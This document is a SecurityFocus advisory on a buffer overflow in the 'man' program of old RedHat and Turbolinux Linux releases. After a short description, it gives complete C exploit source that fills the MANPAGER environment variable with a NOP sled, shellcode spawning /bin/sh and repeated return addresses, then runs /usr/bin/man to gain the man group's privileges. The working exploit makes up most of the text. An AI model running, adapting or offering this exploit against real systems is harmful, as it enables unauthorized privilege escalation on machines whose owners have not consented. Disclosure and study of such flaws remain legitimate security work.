RedHat 4.0/4.1/4.2/5.0/5.1/5.2/6.0/6.2,RedHat man 1.5,Turbolinux man 1.5,Turbolinux 3.5/4.2/4.4 man Buffer Overrun Vulnerability

source: http://www.securityfocus.com/bid/1011/info

A buffer overflow exists in the implementation of the 'man' program shipped with RedHat Linux, and other LInux vendors. By carefully crafting a long buffer of machine executable code, and placing it in the MANPAGER environmental variable, it becomes possible for a would be attacker to gain egid man. 

Using attacks previously outlined by Pawel Wilk, and available in the reference portion of the credit section, it is possible for an attacker to alter manpages such that code will be executed. Upon looking up an altered manpage, code will be executed with the privileges of the person running man. If this person is the root user, root privileges can be obtained.

/*
 * (c) 2000 babcia padlina / b0f
 * (lcamtuf's idea)
 *
 * redhat 6.1 /usr/bin/man exploit
*/

#include <stdio.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <string.h>

#define NOP		0x90
#define OFS		1800
#define BUFSIZE		4002
#define ADDRS		1000

long getesp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(argc, argv)
int argc;
char **argv;
{
	char *execshell =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";

	char *buf, *p;
	int noplen, i, ofs;
	long ret, *ap;

	if(!(buf = (char *)malloc(BUFSIZE+ADDRS+1)))
	{
		perror("malloc()");
		return -1;
	}

	if (argc > 1)
		ofs = atoi(argv[1]);
	else
		ofs = OFS;

	noplen = BUFSIZE - strlen(execshell);
	ret = getesp() + ofs;

	memset(buf, NOP, noplen);
	buf[noplen+1] = '\0';
	strcat(buf, execshell);

	p = buf + noplen + strlen(execshell);
        ap = (unsigned long *)p;

        for(i = 0; i < ADDRS / 4; i++)
                *ap++ = ret;

        p = (char *)ap;
        *p = '\0';

	fprintf(stderr, "RET: 0x%x  len: %d\n\n", ret, strlen(buf));

	setenv("MANPAGER", buf, 1);
	execl("/usr/bin/man", "man", "ls", 0);

	return 0;
}